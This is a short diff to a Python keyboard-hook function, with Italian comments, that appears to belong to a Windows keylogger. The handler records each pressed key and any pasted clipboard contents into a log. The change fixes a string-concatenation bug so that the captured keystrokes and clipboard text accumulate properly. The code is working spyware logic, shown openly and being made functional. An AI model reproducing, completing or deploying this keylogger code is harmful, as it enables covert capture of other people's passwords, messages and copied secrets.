@@ -97,10 +97,10 @@ def KeyStroke(event):
             win32clipboard.CloseClipboard()
             # li stampa
             print ("[PASTE] - %s" % (pasted_value),)
-            log += ("[PASTE] - %s" % (pasted_value),)
+            log += "[PASTE] - %s" % (pasted_value)
         else:
             print ("[%s]" % event.Key,)
-            log += ("[%s]" % event.Key,)
+            log += "[%s]" % event.Key
 
     # passa l'esecuzione al successivi 'hook' registrato
     return True
